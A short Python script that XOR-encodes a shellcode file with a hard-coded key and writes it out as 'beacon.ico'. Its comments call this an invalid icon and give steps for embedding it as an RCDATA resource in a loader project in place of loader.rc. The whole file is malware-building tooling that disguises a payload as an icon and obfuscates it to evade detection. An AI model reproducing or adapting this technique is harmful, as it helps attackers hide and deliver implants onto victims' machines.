#!/usr/bin/env python3
# after running this, replace loader.rc with beacon.ico resource
#   1. delete loader.rc
#   2. right-click Resource Files -> Add -> Resource...
#   3. Import -> select beacon.ico
#   4. set type to RCDATA
from Crypto.Util.number import bytes_to_long, long_to_bytes  
src_file = open('shellcode.bin','rb')
src_data = src_file.read()
dst_file = open('beacon.ico', 'wb') # not an actual valid .ico
  
key = [0xA0, 0XDD, 0XAF, 0X4A, 0X5B, 0X1C, 0X4B, 0X0D, 0XCC, 0XCC, 0XBB, 0XAA]
  
result = b''
n = 0
for d in range(0,len(src_data)):
    if n >= len(key):
        n=0
    result+=long_to_bytes(src_data[d]^key[n])
    n += 1  

src_file.close()
dst_file.write(result)
dst_file.close()
